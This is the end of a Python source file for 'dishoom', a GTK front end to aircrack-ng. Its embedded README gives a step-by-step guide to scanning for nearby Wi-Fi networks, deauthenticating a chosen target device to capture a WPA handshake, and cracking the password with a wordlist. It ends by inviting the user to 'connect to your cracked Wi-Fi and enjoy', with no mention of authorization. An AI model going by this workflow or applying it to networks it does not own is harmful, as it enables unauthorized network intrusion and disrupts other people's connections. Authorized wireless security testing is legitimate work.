             Gtk.STOCK_OPEN, Gtk.ResponseType.OK))

        response = dialog.run()
        if response == Gtk.ResponseType.OK:
            print("Open clicked")
            if (file_type == "cap"):
                self.cap= dialog.get_filename()
                self.label_cap_output.set_text(self.cap)

            elif (file_type == "wordlist"):
                self.wordlist= dialog.get_filename()
                self.label_wordlist_output.set_text(self.wordlist)

            print("File selected: " + dialog.get_filename())
        elif response == Gtk.ResponseType.CANCEL:
            print("Cancel clicked")

        dialog.destroy()
        
    # mainwindow button | functionality
    def Gotomainwindow(self, button):
        mainWindow = MainWindow()
        mainWindow.show_all()
        self.hide()

#window = MainWindow()
#window.connect("destroy", Gtk.main_quit)
#window.show_all()
#Gtk.main()


# Embedded README content as a string
README_CONTENT = """
'dishoom'

The 'dishoom' is a Python package for the GUI of aircrack-ng.

Requirements:
-------------
'gnome-terminal'(if you are using gnome desktop then you have already in your system)  and 'aircrack-ng' should be installed. 
You can install these using the following commands:

    sudo apt install gnome-terminal
    sudo apt install aircrack-ng

Installation:
-------------
To install 'dishoom', use the following command:

    pip install dishoom

After installation, you can type 'dishoom' anywhere in the terminal to run it.

Usage:
------
Once successfully run, it will show you the main window containing available interfaces 
on your machine, as well as three buttons to interact with them.

General Workflow:
-----------------
1. **Scan** and **Manage Interface** buttons:
  - Before clicking these buttons, you need to select an interface.
  - Once selected, the action will be performed on the chosen interface.

2. **Scan**:
  - Click 'Scan' after selecting an interface to see the available Wi-Fi networks around you. 
  - Choose a target and click the 'Capture' button.

3. **Monitor Mode**:
  - Click 'Monitor Mode Start' to enable the interface to capture the 4-way handshake. 
  - Note: Your Wi-Fi connection will be disconnected and you won’t be able to reconnect while in monitor mode. 
  - You can undo this later (see the last part of this text).

4. **Check for interfering processes**:
  - You can click 'Interface check' to view any processes that might interfere with your work. 
  - If necessary, you can click 'Kill Processes' to terminate these processes.
  - It's not required, but some processes can cause issues.

5. **Stopping Network Manager**:
  - Before continuing, click 'Network Manager Stop' to disable services that might prevent your work.

6. **Capture**:
  - Click 'Capture', it will ask for a filename (don't add an extension). Enter a filename and click 'Start Capture on ...'.
  - A terminal window will open (you might be asked for your sudo password to run the script as sudo). 
  - Look for a line starting with "WPA handshake: ...". If you see this, you're good to go.
  - If you don't see the handshake, refer to the terminal window and provide a station input.
  - (Look for "STATION" and use a value under it).
  - Provide a deauthentication value (e.g., '10' for fewer requests or '100' for more). 
  - Click 'Deauthenticate' to disconnect the target device. 
  - When the device reconnects, the "WPA handshake: ..." message should appear in the terminal window.

7. **Cracking**:
  - After capturing, click 'Crack' to select the .cap file you created earlier.
  - (You can found .cap file in the .dishoom folder in your home directory).
  - The program will prompt for a wordlist file. You can use popular wordlists like 'rockyou.txt' or create your own.
  - Select the wordlist and click 'Start Crack'. If the wordlist contains the correct password or hash, the password will appear in the last opened window.

Notes:
------
 - Cracking may take some time depending on the wordlist size and password complexity.
 - If no password is found, it’s possible your wordlist doesn't contain the correct password.

Final Steps:
-------------
  - After you're done, you should stop monitor mode to return your interface to managed mode (for reconnecting to Wi-Fi). You can also restart the Network Manager.
  - To do this, go to the main window and click 'Manage Interface'. From there, you can stop monitor mode and start the Network Manager.

Now you can connect to your cracked Wi-Fi and enjoy!

Thanks for using 'dishoom'!  

********************************************************************************************
                                       End
********************************************************************************************
"""

def format_readme_content(readme_content):
    # Initialize text wrapper for terminal output
    wrapper = textwrap.TextWrapper(width=500, expand_tabs=False, replace_whitespace=False)
    # Format the README content into wrapped lines
    formatted_readme = wrapper.fill(readme_content)
    return formatted_readme

class CustomHelpFormatter(argparse.HelpFormatter):
    # Custom formatter for argparse to handle --help gracefully
    def _split_lines(self, text, width):
        # Wrapping lines for readability
        return textwrap.wrap(text, width)

def show_custom_message():
    print("dishomm takes no arguments, it is a GUI which you can run by typing 'dishoom' with no argument or ('dishoom --help' or 'dishoom -h') to see how to use.")

def main():
    # Initialize the parser for command-line arguments
    parser = argparse.ArgumentParser(prog='dishoom', description="A Python package based on Aircrack-ng", formatter_class=CustomHelpFormatter)

    # Check if there are any arguments provided other than --help
    if len(sys.argv) > 1:
        if '--help' in sys.argv or '-h' in sys.argv:
            # Show the README content when --help or -h is passed
            formatted_readme = format_readme_content(README_CONTENT)  # Make sure README_CONTENT is defined
            print(formatted_readme)
            sys.exit(0)
        else:
            # Display the custom message if any other argument is provided
            show_custom_message()
            sys.exit(1)  # Exit after showing the message to avoid GUI launch

    # Default behavior: Launch the GUI if no arguments are provided
    window = MainWindow()
    window.show_all()
    Gtk.main()

if __name__ == "__main__":
    main()





